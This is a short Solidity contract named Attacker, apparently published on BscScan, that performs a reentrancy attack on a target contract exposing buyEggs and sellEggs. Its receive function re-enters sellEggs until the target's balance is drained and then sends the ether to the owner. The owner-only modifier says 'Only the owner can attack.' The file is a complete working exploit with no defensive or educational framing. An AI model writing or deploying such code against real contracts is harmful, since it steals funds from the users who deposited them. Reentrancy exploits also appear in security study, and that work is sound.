/**
 *Submitted for verification at BscScan.com on 2022-10-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IEtherBank {
    function buyEggs() external payable;
    function sellEggs() external;
}

contract Attacker {
    IEtherBank public immutable someBank;
    address private owner;

    constructor(address etherBankAddress) {
        someBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function test() external payable onlyOwner {
        someBank.buyEggs{value: msg.value}();
        someBank.sellEggs();
    }

    receive() external payable {
        if (address(someBank).balance > 0) {
            someBank.sellEggs();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}